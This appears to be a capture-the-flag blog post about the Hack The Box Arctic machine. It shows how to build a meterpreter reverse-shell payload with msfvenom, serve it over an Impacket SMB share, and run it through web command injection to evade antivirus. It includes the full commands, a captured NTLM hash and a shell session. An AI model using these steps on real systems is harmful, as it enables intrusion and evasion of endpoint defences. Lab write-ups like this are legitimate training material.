---
layout: post
title: Bypass AV using Impacket SmbServer
categories:
  - Exploits
---


<br>This Topic is really interesting because many people don't know exactly how to bypass common AV in windows machine, if you look at most of the AV these days heuristic detection is off even in the enterprise/Companies because it takes a lot of CPU usage.

<br>And this is where we can utilise this Weak spot, Consider a scenario where we have a RCE, or OS-command Injection on the Web, for this I am taking the HTB Arctic machine, which fit's perfectly for this situation.

<br>Now as we know that machine have AV because of which we couldn't able to execute a meterpreter payload, and because of that we created a Encrypted meterpreter with veil evasion.
<br>With this method we don't need to Encrypt our meterpreter payload, we just need to set up our Impacket smb server and then run the command which will request our payload file and run that in the memory, because heuristic detection is off we can easily Bypass it.

<br>**Poc**
<br>If you have not Done the [Arctic](https://teckk2.github.io/writeup/2017/12/27/Arctic.html) machine, I recommend first follow the steps and reach the step where we have RCE on the web,

<br>Now first generate the Payload

<font size="1">
<div style="height:150px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
  
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.*.*.10 LPORT=4455 -f exe > arctic.exe
<br>No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<br>No Arch selected, selecting Arch: x86 from the payload
<br>No encoder or badchars specified, outputting raw payload
<br>Payload size: 341 bytes
<br>Final size of exe file: 73802 bytes
<br><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># </p>
</div>
</font>

<br>Now Download and Install the [Impacket Server](https://github.com/CoreSecurity/impacket).
<br>And then run it 

<font size="1">
<div style="height:150px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># impacket-smbserver teck /root/Desktop/
<br>Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies</p>

<p>[*] Config file parsed
<br>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<br>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<br>[*] Config file parsed
<br>[*] Config file parsed
<br>[*] Config file parsed</p>
</div>
</font>
<br>In this I am using teck as the remote folder name to represent on the server and my file is in /root/Desktop/
<br>Now our SMB server is up and runnig now go to the web page and request for the file with the command **{/c \\10.0.0.10\teck\arctic.exe}**.
<br> ![SMB-Request](https://teckk2.github.io/assets/images/Arctic/17.PNG)
<br>Before you execute the command make sure to set up the meterpreter listner
<br>After executing wait for 30-40 Sec to get the request on the SMB server

<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
  
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># impacket-smbserver teck /root/Desktop/
<br>Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies</p>

<p>[*] Config file parsed
<br>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<br>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<br>[*] Config file parsed
<br>[*] Config file parsed
<br>[*] Config file parsed
<br>[*] Incoming connection (10.10.10.11,51377)
<br>[*] AUTHENTICATE_MESSAGE (ARCTIC\tolis,ARCTIC)
<br>[*] User tolis\ARCTIC authenticated successfully
<br>[*] <br>tolis::ARCTIC:4141414141414141:2c61717958f1127eca09aa171e1c1d09:01010000000000000065347207f9d30170ad6d3e142ee07700000000010010007500<br>5300590056004f006700630067000200100061004c0076004b0078004c0050007a000300100075005300590056004f006700630067000400100061004c0076004b00<br>78004c0050007a00070008000065347207f9d301060004000200000008003000300000000000000000000000003000005f5d2c0dd8d042f2bceefe6e8fb2072d4dd0<br>38e23ce10f454d55eee31d91688c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00<br>31003000000000000000000000000000</p>

</div>
</font>

<br>We got the request Now check our MSF

<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
 
<p>msf > use exploit/multi/handler 
<br>msf exploit(<font color="red">multi/handler</font>) > set payload windows/meterpreter/reverse_tcp
<br>payload => windows/meterpreter/reverse_tcp
<br>msf exploit(<font color="red">multi/handler</font>) > set LHOST 10.*.*.10
<br>LHOST => 10.10.14.10
<br>msf exploit(<font color="red">multi/handler</font>) > set LPORT 4455
<br>LPORT => 4455
<br>msf exploit(<font color="red">multi/handler</font>) > exploit</p>

<p><font color="RoyalBlue">[*]</font> Started reverse TCP handler on 10.*.*.10:4455 
<br><font color="RoyalBlue">[*]</font> Sending stage (179779 bytes) to 10.10.10.11
<br><font color="RoyalBlue">[*]</font> Meterpreter session 1 opened (10.*.*.10:4455 - 10.10.10.11:51379) at 2018-05-31 13:47:39 -0400</p>

<p>meterpreter > getuid 
<br>Server username: ARCTIC\tolis
<br>meterpreter > shell 
<br>Process 3848 created.
<br>Channel 1 created.
<br>Microsoft Windows [Version 6.1.7600]
<br>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</p>

<p>C:\ColdFusion8\runtime\bin>whoami
<br>whoami
<br>arctic\tolis</p>

<p>C:\ColdFusion8\runtime\bin> </p>

</div>
</font>

<br>As you can see we successfully executed our meterpreter payload in the memory and bypass the AV and get shell.
<br>I learned This method from my mentor [KNX](https://twitter.com/ddarix), you can check the Orignal Video.
<iframe width="560" height="315" src="https://www.youtube.com/embed/BLBFKp20idE" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>

<p class="message">
  ~ Hack the World and keep Loving Little Prince.
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>

